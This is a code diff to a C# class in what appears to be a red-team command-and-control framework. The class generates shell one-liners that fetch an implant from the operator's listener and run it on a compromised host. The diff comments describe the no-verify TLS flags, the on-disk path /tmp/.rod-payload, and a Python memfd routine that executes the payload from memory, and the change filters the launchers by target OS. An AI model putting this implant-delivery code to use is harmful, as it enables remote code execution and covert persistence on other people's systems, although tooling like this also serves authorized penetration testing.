@@ -5,16 +5,18 @@ namespace Rod.Transport.Listeners.ShellCatch;
 /// into a real implant (architecture.md Sec 5.2, Sec 6, Sec 8). Each
 /// launcher is the standard fetch-and-run shape the delivery flow
 /// defines -- fetch the payload bytes over the engagement's web listener,
-/// present the deployment credential, run what came back -- expressed in the
-/// shell family the target is known or guessed to have. The disk-or-memory
-/// choice is the operator's at paste time, not a build-time axis: every
-/// artifact is a plain native executable with no self-reference, so the
-/// Linux in-memory family renders beside the disk trio for every payload.
-/// An https front's TLS terminates against the engagement CA, which no
-/// stock target toolchain trusts (the implant pins it; curl and friends
-/// verify against system stores), so the https spellings carry each
-/// family's no-verify flag -- the credential gates the fetch, and the
-/// fetched artifact's own enrollment pins the CA.
+/// present the deployment credential, run what came back -- expressed in
+/// the shell family the target is known or guessed to have. The families
+/// render for the payload's own target OS: a Windows artifact offers the
+/// PowerShell fetch alone (a curl one-liner would download a PE and die at
+/// the chmod, spending the credential on a command that cannot work), a
+/// Linux artifact the Unix families -- the disk-or-memory choice stays the
+/// operator's at paste time, not a build-time axis. An https front's TLS
+/// terminates against the engagement CA, which no stock target toolchain
+/// trusts (the implant pins it; curl and friends verify against system
+/// stores), so the https spellings carry each family's no-verify flag --
+/// the credential gates the fetch, and the fetched artifact's own
+/// enrollment pins the CA.
 /// Pure rendering of (url, credential) into commands: the target-side
 /// behavior is plain, documented fetch-execute in every family.
 /// </summary>
@@ -25,13 +27,13 @@ public static class ShellUpgradeLaunchers
 
     /// <summary>
     /// Renders the launcher families for a payload fetch at
-    /// <paramref name="url"/> authorized by <paramref name="secret"/>. Every
-    /// family renders for every payload: the disk trio is the universal
-    /// fallback (the shell fingerprint is a guess, and a family that lands a
-    /// file beats one that cannot run at all), and every native binary runs
-    /// from an anonymous fd, so the in-memory family rides along.
+    /// <paramref name="url"/> authorized by <paramref name="secret"/>,
+    /// filtered to the payload's target OS ("linux" or "windows"). A null
+    /// or unrecognized OS renders every family -- the fallback for records
+    /// that predate the target field, where the shell's own family is a
+    /// guess the operator makes at paste time.
     /// </summary>
-    public static IReadOnlyList<Launcher> Render(string url, string secret)
+    public static IReadOnlyList<Launcher> Render(string url, string secret, string? targetOs = null)
     {
         const string unixPath = "/tmp/.rod-payload";
         // The front's TLS terminates against the engagement CA -- one shared
@@ -94,6 +96,14 @@ public static class ShellUpgradeLaunchers
                 + pyMemfd
                 + "os.write(f,d);"
                 + "os.execv('/proc/self/fd/%d'%f,['rod-implant'])\""));
+
+        // The payload's own families alone: a command for another OS would
+        // spend the fetch credential on a download that cannot run. An
+        // unknown OS keeps every family -- the pre-target-field records,
+        // where the shell the operator is pasting into is the only clue.
+        var os = targetOs?.Trim().ToLowerInvariant();
+        if (os is "linux" or "windows")
+            launchers = launchers.Where(l => l.Os == os).ToList();
 
         return launchers;
     }
